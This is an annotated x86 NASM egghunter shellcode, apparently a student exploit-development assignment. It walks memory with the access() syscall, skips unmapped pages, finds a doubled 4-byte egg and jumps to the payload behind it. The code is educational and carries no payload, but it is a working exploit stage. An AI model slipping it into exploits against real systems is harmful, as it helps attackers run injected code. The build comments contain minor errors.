; author ron chan
; compile
; nasm -f assignment3.nasm
; ld assigment3.o -o assignment3 
; objdump -d assignment3



global _start			

section .text
_start:	
	xor edx,edx ; clear the edx
	xor ecx,ecx ; clear the ecx as well, in original paper, this step is not invovled, however I found out if missing this step, the parameter of access is not initialized, thus causing segmentation error, so i have to clear out ecx in order to get this work
	; access (*pathname, int mode)
	; thus ebx is the address, and ecx should be 0
page:
	or dx,0xfff ; because 1000 or fff = 1fff, 1any or fff = 1fff, so this is jumping and aligning the page, if invalid address is found, this could speed up the process!
	
comparison:
	inc edx ; turning 1fff to 2000
	lea ebx,[edx+0x4] ; ebx now equals to 1004 if edx is 1000
	push byte +0x21 ; make eax to be 0x21
	pop eax
	int 0x80
	cmp al,0xf2 ; is the address invalid? if so, eax would equals to xxxxxf2
	jz page ; if invalid, lets do increase 2000 to 2fff, this help to increase speed
	mov eax,0x50905090
	mov edi,edx
	scasd
	jnz comparison ;edi jmped forward 4 bytes, so doing twice could make sure two egg is found in a row.
	scasd
	jnz comparison
	jmp edi
